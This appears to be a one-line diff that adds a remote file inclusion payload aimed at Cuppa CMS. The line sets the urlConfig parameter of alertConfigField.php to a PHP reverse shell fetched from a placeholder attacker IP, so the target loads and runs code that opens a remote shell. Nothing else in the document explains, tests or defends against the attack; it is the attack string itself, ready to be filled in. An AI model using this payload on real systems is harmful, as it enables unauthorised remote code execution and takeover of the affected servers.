@@ -1,0 +1,1 @@
+http://<targetIP>/<cuppa_path>/alerts/alertConfigField.php?urlConfig=http://<attackerIP>/php-reverse-shell.php
